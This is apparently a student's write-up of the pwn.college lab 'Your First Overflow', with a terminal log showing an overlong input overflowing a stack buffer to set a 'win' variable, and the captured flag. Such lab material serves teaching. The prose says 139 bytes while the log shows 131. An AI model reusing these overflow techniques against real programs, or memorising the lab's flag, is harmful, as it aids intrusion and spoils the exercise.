# Binary Exploitation

## Your First Overflow (easy)
Overflow a buffer on the stack to set the right conditions to obtain the flag

### Solve
**Flag:** `pwn.college{0RySzV7w7aUAXeTEFMYjyhu-V0Q.dlDOywCM4EzNzEzW}`

Upon looking into the files in the file system, the "challenge" directory had a file named "binary-exploitation-first-overflow-w.c" which was already compiled. Upon running the compiled file, a bunch of information and instructions about the stack and stack overflow were given. To obtain the flag, it was asked to make the value of the variable "win" non-zero which could be done by overflowing the input buffer. It was also given that "The buffer is 126 bytes long, but the program will let you provide an arbitrarily large input length, and thus overflow the buffer." They gave the address of the win variable which was 128 bytes after the start of the input buffer. Therefore, the buffer was overflowed by giving 139 bytes of random input which overflowed the buffer and gave the output as the flag.

```bash
cd /challenge
hacker@binary-exploitation~your-first-overflow-easy:/challenge$ ./binary-exploitation-first-overflow-w
The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffc805e36d0 (rsp+0x0000) | a0 e6 1b 00 00 00 00 00 | 0x00000000001be6a0 |
| 0x00007ffc805e36d8 (rsp+0x0008) | d8 48 5e 80 fc 7f 00 00 | 0x00007ffc805e48d8 |
| 0x00007ffc805e36e0 (rsp+0x0010) | c8 48 5e 80 fc 7f 00 00 | 0x00007ffc805e48c8 |
| 0x00007ffc805e36e8 (rsp+0x0018) | 1c 00 00 00 01 00 00 00 | 0x000000010000001c |
| 0x00007ffc805e36f0 (rsp+0x0020) | 1c 00 00 00 00 00 00 00 | 0x000000000000001c |
| 0x00007ffc805e36f8 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc805e3700 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc805e3708 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc805e3710 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc805e3718 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc805e3720 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc805e3728 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc805e3730 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc805e3738 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc805e3740 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc805e3748 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc805e3750 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc805e3758 (rsp+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc805e3760 (rsp+0x0090) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc805e3768 (rsp+0x0098) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc805e3770 (rsp+0x00a0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc805e3778 (rsp+0x00a8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc805e3780 (rsp+0x00b0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc805e3788 (rsp+0x00b8) | 00 f7 3f 40 21 74 34 88 | 0x88347421403ff700 |
| 0x00007ffc805e3790 (rsp+0x00c0) | d0 47 5e 80 fc 7f 00 00 | 0x00007ffc805e47d0 |
| 0x00007ffc805e3798 (rsp+0x00c8) | d2 1b 40 00 00 00 00 00 | 0x0000000000401bd2 |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffc805e36d0, and our base pointer points to 0x7ffc805e3790.
This means that we have (decimal) 26 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 208 bytes.
The input buffer begins at 0x7ffc805e3700, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 126 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is a "win" variable.
By default, the value of this variable is zero.
However, when this variable is non-zero, the flag will be printed.
You can make this variable be non-zero by overflowing the input buffer.
The "win" variable is stored at 0x7ffc805e3780, 128 bytes after the start of your input buffer.

We have disabled the following standard memory corruption mitigations for this challenge:
- the binary is *not* position independent. This means that it will be
located at the same spot every time it is run, which means that by
analyzing the binary (using objdump or reading this output), you can
know the exact value that you need to overwrite the return address with.

You have chosen to send 4096 bytes of input!
This will allow you to write from 0x7ffc805e3700 (the start of the input buffer)
right up to (but not including) 0x7ffc805e4700 (which is 3970 bytes beyond the end of the buffer).
Send your payload (up to 4096 bytes)!
qwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnm
You sent 131 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffc805e36d0 (rsp+0x0000) | a0 e6 1b 00 00 00 00 00 | 0x00000000001be6a0 |
| 0x00007ffc805e36d8 (rsp+0x0008) | d8 48 5e 80 fc 7f 00 00 | 0x00007ffc805e48d8 |
| 0x00007ffc805e36e0 (rsp+0x0010) | c8 48 5e 80 fc 7f 00 00 | 0x00007ffc805e48c8 |
| 0x00007ffc805e36e8 (rsp+0x0018) | 1c 00 00 00 01 00 00 00 | 0x000000010000001c |
| 0x00007ffc805e36f0 (rsp+0x0020) | 1c 00 00 00 83 00 00 00 | 0x000000830000001c |
| 0x00007ffc805e36f8 (rsp+0x0028) | 00 10 00 00 00 00 00 00 | 0x0000000000001000 |
| 0x00007ffc805e3700 (rsp+0x0030) | 71 77 65 72 74 79 75 69 | 0x6975797472657771 |
| 0x00007ffc805e3708 (rsp+0x0038) | 6f 70 61 73 64 66 67 68 | 0x686766647361706f |
| 0x00007ffc805e3710 (rsp+0x0040) | 6a 6b 6c 7a 78 63 76 62 | 0x627663787a6c6b6a |
| 0x00007ffc805e3718 (rsp+0x0048) | 6e 6d 71 77 65 72 74 79 | 0x7974726577716d6e |
| 0x00007ffc805e3720 (rsp+0x0050) | 75 69 6f 70 61 73 64 66 | 0x66647361706f6975 |
| 0x00007ffc805e3728 (rsp+0x0058) | 67 68 6a 6b 6c 7a 78 63 | 0x63787a6c6b6a6867 |
| 0x00007ffc805e3730 (rsp+0x0060) | 76 62 6e 6d 71 77 65 72 | 0x726577716d6e6276 |
| 0x00007ffc805e3738 (rsp+0x0068) | 74 79 75 69 6f 70 61 73 | 0x7361706f69757974 |
| 0x00007ffc805e3740 (rsp+0x0070) | 64 66 67 68 6a 6b 6c 7a | 0x7a6c6b6a68676664 |
| 0x00007ffc805e3748 (rsp+0x0078) | 78 63 76 62 6e 6d 71 77 | 0x77716d6e62766378 |
| 0x00007ffc805e3750 (rsp+0x0080) | 65 72 74 79 75 69 6f 70 | 0x706f697579747265 |
| 0x00007ffc805e3758 (rsp+0x0088) | 61 73 64 66 67 68 6a 6b | 0x6b6a686766647361 |
| 0x00007ffc805e3760 (rsp+0x0090) | 6c 7a 78 63 76 62 6e 6d | 0x6d6e627663787a6c |
| 0x00007ffc805e3768 (rsp+0x0098) | 71 77 65 72 74 79 75 69 | 0x6975797472657771 |
| 0x00007ffc805e3770 (rsp+0x00a0) | 6f 70 61 73 64 66 67 68 | 0x686766647361706f |
| 0x00007ffc805e3778 (rsp+0x00a8) | 6a 6b 6c 7a 78 63 76 62 | 0x627663787a6c6b6a |
| 0x00007ffc805e3780 (rsp+0x00b0) | 6e 6d 0a 00 00 00 00 00 | 0x00000000000a6d6e |
| 0x00007ffc805e3788 (rsp+0x00b8) | 00 f7 3f 40 21 74 34 88 | 0x88347421403ff700 |
| 0x00007ffc805e3790 (rsp+0x00c0) | d0 47 5e 80 fc 7f 00 00 | 0x00007ffc805e47d0 |
| 0x00007ffc805e3798 (rsp+0x00c8) | d2 1b 40 00 00 00 00 00 | 0x0000000000401bd2 |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7ffc805e3700
- the saved frame pointer (of main) is at 0x7ffc805e3790
- the saved return address (previously to main) is at 0x7ffc805e3798
- the saved return address is now pointing to 0x401bd2.
- the canary is stored at 0x7ffc805e3788.
- the canary value is now 0x88347421403ff700.
- the address of the win variable is 0x7ffc805e3780.
- the value of the win variable is 0xa6d6e.

You win! Here is your flag:
pwn.college{0RySzV7w7aUAXeTEFMYjyhu-V0Q.dlDOywCM4EzNzEzW}


Goodbye!

```

### New Learnings
-> overflowing a buffer on the stack

### References 
https://www.youtube.com/watch?v=wa3sMSdLyHw&t=724s
